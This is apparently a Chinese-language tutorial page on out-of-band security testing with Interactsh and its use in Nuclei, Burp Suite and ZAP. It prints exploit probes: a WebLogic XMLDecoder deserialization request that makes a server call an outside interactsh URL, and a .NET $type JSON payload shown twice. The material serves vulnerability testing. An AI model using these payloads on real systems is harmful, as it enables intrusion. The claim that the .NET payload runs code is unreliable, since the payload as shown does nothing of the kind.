---
title: '使用 Interact.sh 进行带外测试 (OAST)'
description: 'Awesome SRC Experience - 使用 Interact.sh 进行带外测试 (OAST)'
---

# 使用 Interact.sh 进行带外测试 (OAST)

Interactsh 是一个开源工具，用于检测带外交互。它专门设计用于发现那些会导致系统与外部产生联系的漏洞。在红队演练中，interactsh 也是一个非常有价值的工具，安全专业人员可以利用它模拟真实的网络攻击，以识别目标组织安全防御中的弱点。

## 带外应用安全测试 (OAST) 与 Interactsh

interactsh 是一个基于云的平台，简化了 OAST 测试流程。它自动化了测试过程，节省了时间和资源，并提供了一个集中化的平台来管理和报告 OAST 测试结果。这使得识别和修复漏洞变得更加容易，从而确保应用程序的安全性。许多攻击者和漏洞赏金猎人现在都转向使用 OAST 方法来检测互联网应用程序和 API 中未知的安全问题。为了加强我们的安全检测能力，我们发现这些结束整合到我们的框架中是更适合的，以便更好地洞察应用程序级别的弱点。

例如，使用 Interactsh，测试人员可以执行一个 OAST 负载 (payload)，这个负载以 HTTP 请求的形式发送，用于测试应用程序中是否存在反序列化漏洞。这个请求可能看起来像：

```html
POST /api/deserialize HTTP/1.1 Host: example.com Content-Type: application/json
{“$type”:”System.Data.DataSet,System.Data”,”Tables”:[{“$type”:”System.Data.DataTable,System.Data”,”Rows”:[{“$type”:”System.Data.DataRow,System.Data”,”ItemArray”:[“Interact.sh”]}]}]}
```

这个请求发送到应用程序后，如果应用程序存在反序列化漏洞，攻击者就可以在服务器上执行来自 Interactsh 的代码。

## Nuclei 和 Interactsh 集成自动 OOB 测试

NUclei v2.3.6 现在支持使用 interact.sh API 来实现基于 OOB 的漏洞扫描，并内置了自动请求关联功能。你只需在请求中的任意位置写上 “&lbrace;&lbrace;interactsh-url&rbrace;&rbrace;”，并添加一个 `interact_protocol` 的匹配器。Nuclei 会自动关联交互到模板和生成请求，从而实现无缝的 OOB 扫描。

以下模板使用 Interactsh 的 OOB 服务器来检测 WebLogic 的反序列化漏洞。

```html
POST /wls-wsat/RegistrationRequesterPortType HTTP/1.1
Host: &lbrace;&lbrace;Hostname&rbrace;&rbrace;
Content-Type: text/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,
Content-Type: text/xml;charset=UTF-8
Content-Length: 873

<soapenv:Envelope xmlns:soapenv=”http://schemas.xmlsoap.org/soap/envelope/”>
<soapenv:Header>
<work:WorkContext xmlns:work=”http://bea.com/2004/06/soap/workarea/">
<java version=”1.8" class=”java.beans.XMLDecoder”>
<void id=”url” class=”java.net.URL”>
<string>http://&lbrace;&lbrace;interactsh-url&rbrace;&rbrace;</string>
</void>
<void idref=”url”>
<void id=”stream” method =”openStream”/>
</void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```

![](/img/1_MI-dGzDVTd-a4lLNQb5LIw.webp)

## 另一个示例

测试人员可以发送一个包含 OAST 有效载荷的 HTTP 请求，来测试应用程序是否存在反序列化漏洞。这个请求可能看起来像这样：

```html
POST /api/deserialize HTTP/1.1 Host: example.com Content-Type: application/json
{“$type”:”System.Data.DataSet,System.Data”,”Tables”:[{“$type”:”System.Data.DataTable,System.Data”,”Rows”:[{“$type”:”System.Data.DataRow,System.Data”,”ItemArray”:[“Interact.sh”]}]}]}
```

这个请求发送到应用程序后，如果应用程序存在反序列化漏洞，攻击者既可以在服务器上执行来自 Interactsh 的代码。

## Interactsh 与流行扫描器的集成

- Burp Suite 扩展——interactsh collaborator：这是一个 Burp Suite 的扩展，可以直接使用 Interactsh。

- OWASP ZAP 插件——OAST：OWASP ZAP 通过 OAST 插件可以与 Interactsh 集成。利用 ZAP 的脚本功能，你可以创建强大的带外扫描规则，充分利用 Interactsh 的功能。
- Nulcei--OAST：Nuclei 漏洞扫描器利用 Interactsh 自动生成有效载荷，检测基于带外的安全漏洞。

## 结论

带外应用程序安全测试 (OAST) 是全面应用程序安全策略中的一个关键组成部分。Interactsh 简化了 OAST 测试过程，并未应用程序的安全态势提供了宝贵的洞见。重视应用城市徐安全的组织应该考虑使用 Interactsh 进行 OAST 测试。
